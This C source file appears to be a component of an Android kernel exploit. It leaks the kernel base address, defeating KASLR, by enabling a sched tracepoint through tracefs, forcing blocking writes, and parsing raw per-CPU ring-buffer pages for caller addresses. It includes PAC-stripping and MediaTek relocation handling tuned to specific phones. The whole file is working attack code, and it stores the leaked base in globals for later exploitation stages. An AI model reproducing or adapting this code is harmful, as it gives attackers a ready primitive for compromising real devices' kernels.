#include "common.h"

#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
#ifndef SLIDE_TRACEFS_EVENT_ID
#define SLIDE_TRACEFS_EVENT_ID 109
#endif
#ifndef SLIDE_TRACEFS_MAX_CANDIDATE
#define SLIDE_TRACEFS_MAX_CANDIDATE 0x1f0000ULL
#endif

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_parse_page(
    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
  if (page_len < 20) {
    return 0;
  }

  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t event_header = 0;
    memcpy(&event_header, page + pos, sizeof(event_header));
    uint32_t type_len = event_header & 0x1fU;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t record_len = (size_t)type_len * 4;
    size_t record = pos + 4;
    if (record + record_len > end) {
      break;
    }
    uint16_t event_id = 0;
    memcpy(&event_id, page + record, sizeof(event_id));
    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
      uint64_t caller = 0;
      memcpy(&caller, page + record + 16, sizeof(caller));
      static int raw_callers;
      if (raw_callers < 8) {
        pr_info("slide tracefs raw caller=%016llx event=%u len=%zu\n",
                (unsigned long long)caller, event_id, record_len);
      }
      raw_callers++;
#if defined(SLIDE_TRACEFS_STRIP_PAC) && SLIDE_TRACEFS_STRIP_PAC
      /* iqoo-z9-5g: kernel PAC-ret signs saved PCs; restore bits [63:48].
       * The __get_wchan unwind loop also misdetects sched-region frames on
       * ~50% of boots (PAC bits shift the value below the range compare),
       * so the schedule-internal return address is accepted as an anchor
       * alongside the worker_thread caller. */
      caller = (caller & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
#endif
      static const uint64_t anchor_offsets[] = {
        SLIDE_TRACEFS_WORKER_CALLER_OFF,
#ifdef SLIDE_TRACEFS_SCHED_CALLER_OFF
        SLIDE_TRACEFS_SCHED_CALLER_OFF,
#endif
      };
      for (size_t anchor = 0;
           anchor < sizeof(anchor_offsets) / sizeof(anchor_offsets[0]);
           anchor++) {
        uint64_t base = caller - anchor_offsets[anchor];
        /* RELR-relocated kernels (MTK) load at an arbitrary virtual base
         * far above KIMAGE_TEXT_BASE; accept any 64K-aligned base inside
         * the kernel VA window and require a second confirming event. */
        if (base >= KIMAGE_TEXT_BASE && base < 0xfffffffe00000000ULL &&
            (base & 0xffffULL) == 0) {
          uint64_t candidate = base - KIMAGE_TEXT_BASE;
          if (candidate > SLIDE_TRACEFS_MAX_CANDIDATE) {
            continue;
          }
          static uint64_t pending_base;
          static int pending_hits;
          if (base != pending_base) {
            pending_base = base;
            pending_hits = 1;
            continue;
          }
          pending_hits++;
          if (pending_hits < 3) {
            continue;
          }
          pr_success("slide tracefs caller=%016llx anchor=%zu "
                     "base=%016llx candidate=%016llx\n",
                     (unsigned long long)caller, anchor,
                     (unsigned long long)base,
                     (unsigned long long)candidate);
          *candidate_out = (uintptr_t)candidate;
          return 1;
        }
      }
    }
    pos = record + record_len;
  }
  return 0;
}

static int slide_tracefs_trigger(void) {
  char path[96];
  snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%d", getpid());
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
    return 0;
  }
  size_t chunk_size = 0x40000;
  unsigned char *chunk = calloc(1, chunk_size);
  if (!chunk) {
    int saved_errno = errno;
    close(fd);
    unlink(path);
    errno = saved_errno;
    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
    return 0;
  }
  int ok = 1;
  for (int round = 0; round < 16 && ok; round++) {
    size_t done = 0;
    while (done < chunk_size) {
      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
      if (wrote < 0 && errno == EINTR) {
        continue;
      }
      if (wrote <= 0) {
        ok = 0;
        break;
      }
      done += (size_t)wrote;
    }
  }
  free(chunk);
  if (ok && fsync(fd) != 0) {
    ok = 0;
  }
  int saved_errno = errno;
  close(fd);
  unlink(path);
  errno = saved_errno;
  if (!ok) {
    pr_error("slide tracefs trigger write failed errno=%d\n", errno);
    return 0;
  }
  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
  return 1;
}

static int slide_tracefs_leak_kernel_base(void) {
  static const char tracing_on[] =
      SLIDE_TRACEFS_ROOT "/tracing_on";
  static const char trace[] =
      SLIDE_TRACEFS_ROOT "/trace";
  static const char event_enable[] =
      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";

  if (!slide_tracefs_write(tracing_on, "0")) {
    pr_error("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }

  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (trace_fd >= 0) {
    close(trace_fd);
  }
  if (!slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_error("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }
  if (!slide_tracefs_trigger()) {
    slide_tracefs_write(tracing_on, "0");
    slide_tracefs_write(event_enable, "0");
    return 0;
  }
  sleep(1);

  /* Drain trace_pipe_raw while tracing is still ON. A fresh pipe reader
   * only sees the current page onward, and the final page written before
   * tracing_on=0 can be flooded by unrelated blockers (on MTK, module
   * kthreads emit constantly and push worker events out of the last
   * page). Poll the live stream for up to ~5s instead. */
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  uintptr_t candidate = 0;
  int found = 0;
  enum { SLIDE_TRACEFS_MAX_CPUS = 32 };
  if (cpu_count > SLIDE_TRACEFS_MAX_CPUS) {
    cpu_count = SLIDE_TRACEFS_MAX_CPUS;
  }
  int fds[SLIDE_TRACEFS_MAX_CPUS];
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    char path[128];
    snprintf(path, sizeof(path),
             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    fds[cpu] = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
  }
  unsigned char page[4096];
  for (int round = 0; round < 500 && !found; round++) {
    for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
      if (fds[cpu] < 0) {
        continue;
      }
      ssize_t got;
      while ((got = read(fds[cpu], page, sizeof(page))) > 0) {
        if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
          found = 1;
          break;
        }
      }
    }
    if (!found) {
      usleep(10000);
    }
  }
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    if (fds[cpu] >= 0) {
      close(fds[cpu]);
    }
  }
  slide_tracefs_write(tracing_on, "0");
  slide_tracefs_write(event_enable, "0");
  if (!found) {
    pr_error("slide tracefs worker caller not found\n");
    return 0;
  }

  slide_p0_offset = candidate;
  kaslr_base = KIMAGE_TEXT_BASE + candidate;
  kaslr_slide = candidate;
  kaslr_done = 1;
  /* The recovered virtual base is exact (caller = base + link offset).
   * Use canonical virtual addresses for kernel image data everywhere:
   * the direct-map alias math assumes the phys slide equals the virtual
   * slide, which does not hold on RELR-relocated boots (MTK). */
  data_addr_canonical = 1;
  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
             "slide=%016llx p0_offset=%08zx\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide, slide_p0_offset);
  return 1;
}

int slide_leak_kernel_base(void) {
  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
  if (forced_offset_arg && *forced_offset_arg) {
    char *end = NULL;
    errno = 0;
    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
    if (errno || end == forced_offset_arg || *end ||
        value > SLIDE_TRACEFS_MAX_CANDIDATE || (value & 0xffffULL) != 0) {
      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
      return 0;
    }
    slide_p0_offset = (uintptr_t)value;
    kaslr_base = KIMAGE_TEXT_BASE + slide_p0_offset;
    kaslr_slide = slide_p0_offset;
    kaslr_done = 1;
    data_addr_canonical = 1;
    pr_success("slide-kaslr-ok source=forced pid=%d base=%016llx "
               "slide=%016llx p0_offset=%08zx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide, slide_p0_offset);
    return 1;
  }
  return slide_tracefs_leak_kernel_base();
}
